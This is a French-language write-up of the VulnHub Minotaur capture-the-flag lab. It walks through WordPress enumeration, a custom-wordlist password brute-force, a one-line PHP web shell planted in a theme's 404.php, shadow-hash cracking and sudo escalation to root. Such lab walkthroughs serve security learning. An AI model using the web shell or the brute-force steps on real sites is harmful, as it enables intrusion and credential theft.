## Solution du CTF SecTalks: BNE0x00 - Minotaur de VulnHub

Dernier CTF de la série `SecTalks` créé par [Robert Winkel](https://twitter.com/RobertWinkel), ce CTF a été globalement sympathique  et les indices suivants qui étaient donnés ont empéché de potentielles errances :

> 1. This CTF has a couple of fairly heavy password cracking challenges, and some red herrings.
> 2. One password you will need is not on rockyou.txt or any other wordlist you may have out there. So you need to think of a way to generate it yourself.

Je regrette juste que l'un des mots de passe prennent vraiment beaucoup de temps à casser quand on ne dispose pas d'un GPU. De plus il semble que *Google Colab* stoppe désormais les processus intensifs donc casser un hash avec *Penglab* semble malheureusement être une histoire ancienne.

```
Nmap scan report for 192.168.56.223
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 ed740cc921c45847d40289c7e53e0918 (DSA)
|   2048 0c4ba8247efccd8ab19f87dd9d063005 (RSA)
|   256 409bfef982411793a29634251c53bbae (ECDSA)
|_  256 72840cfcae8108668cb30173815c6f44 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
2020/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
```

## Bulls On Parade

Une énumération web permet de trouver un Wordpress à l'adresse `/bull`. Je lance donc `wpscan` pour en savoir plus (j'ai retiré une partie de l'output) :

```shellsession
$ docker run -it --rm wpscanteam/wpscan --url http://192.168.56.223/bull/ -e ap,at,cb,dbe --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.56.223/bull/ [192.168.56.223]

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.6
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.223/bull/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] Upload directory has listing enabled: http://192.168.56.223/bull/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.2.2 identified (Insecure, released on 2015-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.223/bull/index.php/feed/, <generator>http://wordpress.org/?v=4.2.2</generator>
 |  - http://192.168.56.223/bull/index.php/comments/feed/, <generator>http://wordpress.org/?v=4.2.2</generator>

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.56.223/bull/wp-content/plugins/akismet/
 | Last Updated: 2022-12-01T17:18:00.000Z
 | Readme: http://192.168.56.223/bull/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.0.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.223/bull/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.223/bull/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.56.223/bull/wp-content/plugins/akismet/readme.txt

[+] slideshow-gallery
 | Location: http://192.168.56.223/bull/wp-content/plugins/slideshow-gallery/
 | Last Updated: 2022-10-26T19:25:00.000Z
 | Readme: http://192.168.56.223/bull/wp-content/plugins/slideshow-gallery/readme.txt
 | [!] The version is out of date, the latest version is 1.7.6
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.223/bull/wp-content/plugins/slideshow-gallery/, status: 200
 |
 | Version: 1.4.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.223/bull/wp-content/plugins/slideshow-gallery/readme.txt
```

On voit qu'il remonte deux versions possibles pour le plugin `slideshow-gallery`. Une recherche sur exploit-db remonte une vulnérabilité pour la version `1.4.6` mais elle requiert d'être authentifié.

Avec l'option `-e u` de wpscan j'énumère oles utilisateurs :

```
[i] User(s) Identified:

[+] bully
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

Bien. Maintenant l'un des indices indique qu'il faut créer notre wordlist nous même. J'utilise donc `CeWL` pour extraire les mots du seul article du blog :

```bash
docker run -it --rm cewl http://192.168.56.223/bull/index.php/2015/05/ > words.txt
```

Après avoir fait le ménage pour retirer les mots liés à la structure de la page, je demande à `JohnTheRipper` de générer des dérivés des mots de passe :

```bash
john --rules --wordlist=words.txt --stdout > candidates.txt
```

et c'est parti pour le brute-force :

```bash
docker run -v /tmp/:/wordlists/ -it --rm wpscanteam/wpscan --url http://192.168.56.223/bull/ -U bully -P /wordlists/candidates.txt
```

On trouve bien un mot de passe :

```
[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - bully / Bighornedbulls                                                                                                                                                                                
All Found                                                                                                                                                                                                         
Progress Time: 00:02:33 <==============================================                                                                                                         > (74 / 237) 31.22%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: bully, Password: Bighornedbulls
```

Je n'aurais pas besoin d'exploiter la faille `slideshow-gallery` car je suis admin sur le Wordpress. Je peux simplement éditer un fichier du thème.

Je préfère généralement éditer le fichier `404.php` pour y ajouter ces lignes au début :

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); } 
die();
```

J'ai alors mon exécution de commande en appelant n'importe qu'elle page invalide du blog :

http://192.168.56.223/bull/index.php/yolo?cmd=id

## Bull In The Heather

Une fois un shell PTY récupéré je récupère les identifiants de la base de données :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'bullblog');

/** MySQL database username */
define('DB_USER', 'bully');

/** MySQL database password */
define('DB_PASSWORD', 'Might3*as#FG(');
```

Ces derniers ne sont acceptés nul part. L'utilisateur courant `www-data` semble avoir les permissions pour exécuter un script bash mais ça ne fonctionne pas :

```
www-data@minotaur:/var/www/html/bull$ sudo -l
Matching Defaults entries for www-data on minotaur:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on minotaur:
    (root) NOPASSWD: /root/bullquote.sh
```

Finalement je trouve un premier flag dans la racine web :

```shellsession
www-data@minotaur:/var/www/html$ cat flag.txt 
Oh, lookey here. A flag!
Th15 15 @N 3@5y f1@G!
```

et un second dans `/tmp` :

```
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 121 May 27  2015 /tmp/flag.txt
-rw-r----- 1 root www-data 1148 May 27  2015 /tmp/shadow.bak
```

Il y a aussi une copie lisible du fichier `shadow`. Je copie les hashs intéressants et je les file à JTR :

```
root:$6$15/OlfJP$h70tk3qikcf.kfwlGpYT7zfFg.cRzlJMlbVDSj3zCg4967ZXG0JzN/6oInrnvGf7AZaJFE2qJdBAOc/3AyeGX.:16569:0:99999:7:::
minotaur:$6$3qaiXwrS$1Ctbj1UPpzKjWSgpIaUH0PovtO2Ar/IshWUe4tIUrJf8VlbIIijxdu4xHsXltA0mFavbo701X9.BG/fVIPD35.:16582:0:99999:7:::
heffer:$6$iH6pqgzM$3nJ00ToM38a.qLqcW8Yv0pdRiO/fXOvNv03rBzv./E0TO4B8y.QF/PNZ2JrghQTZomdVl3Zffb/MkWrFovWUi/:16582:0:99999:7:::
h0rnbag:$6$nlapGOqY$Hp5VHWq388mVQemkiJA2U1qLI.rZAFzxCw7ivfyglRNgZ6mx68sE1futUy..m7dYJRQRUWEpm3XKihXPB9Akd1:16582:0:99999:7:::
```

```shellsession
www-data@minotaur:/tmp$ cat flag.txt 
That shadow.bak file is probably useful, hey?
Also, you found a flag!
My m1L|<$|-|@|<3 br1|\|G$ @11 t3h b0y$ 2 t3h y@R|)
```

JTR trouve le mot de passe `Password1` pour le compte `heffer` qui permet d'accèder à un autre flag... mais c'est tout.

```shellsession
heffer@minotaur:~$ cat flag.txt 
So this was an easy flag to get, hopefully. Have you gotten ~minotaur/flag.txt yet?
Th3 fl@G 15: m00000 y0
heffer@minotaur:~$ sudo -l
Matching Defaults entries for heffer on minotaur:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User heffer may run the following commands on minotaur:
    (root) NOPASSWD: /root/bullquote.sh
heffer@minotaur:~$ sudo /root/bullquote.sh
[sudo] password for heffer: 
sudo: /root/bullquote.sh: command not found
```

Après une heure, JTR n'ayant pas cassé d'autre hash sur ma machine, je cherche la solution sur le web : l'utilisateur `minotaur` a le mot de passe `obiwan6` et effectivement le hash aurait été cassé après une plus longue attente (oui mais de combien d'heures ?)

On peut alors obtenir un flag :

```shellsession
minotaur@minotaur:~$ cat flag.txt 
Congrats! You've found the first flag:
M355 W17H T3H 8ULL, G37 73H H0RN!

But can you get /root/flag.txt ?
```

puis passer root :

```shellsession
minotaur@minotaur:~$ sudo -l
Matching Defaults entries for minotaur on minotaur:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User minotaur may run the following commands on minotaur:
    (root) NOPASSWD: /root/bullquote.sh
    (ALL : ALL) ALL
minotaur@minotaur:~$ sudo su
[sudo] password for minotaur: 
root@minotaur:/home/minotaur# cd /root
root@minotaur:~# cat flag.txt 
Congrats! You got the final flag!
Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
```

*Publié le 4 janvier 2023*
